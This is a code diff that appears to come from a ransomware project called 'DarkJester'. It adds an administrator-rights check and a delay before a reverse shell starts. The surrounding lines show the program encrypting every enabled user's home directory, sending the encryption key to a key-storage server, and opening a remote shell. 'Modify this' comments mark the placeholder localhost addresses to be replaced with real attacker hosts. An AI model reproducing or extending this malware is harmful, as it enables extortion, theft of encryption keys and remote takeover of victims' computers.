@@ -46,6 +46,8 @@ import base64
 import requests
 import socket
 import threading
+import ctypes
+import time
 import subprocess as sp
 import platform
 import uuid
@@ -180,6 +182,14 @@ class ReverseShell:
         proc.wait()
 
 if __name__ == "__main__":
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.user32.MessageBoxW(
+            0,
+            "Please run this program as Administrator.", # Modify if needed
+            "Cannot Proceed", # Modify if needed
+            0x10  # MB_ICONERROR
+        )
+        sys.exit(1)
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
     enabled_users = jester.get_enabled_users()
@@ -189,5 +199,6 @@ if __name__ == "__main__":
         if os.path.exists(user_directory):
             jester.encrypt_directory(user_directory, server_url, max_threads=30)
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
+    time.sleep(10)
     shell.start()
 
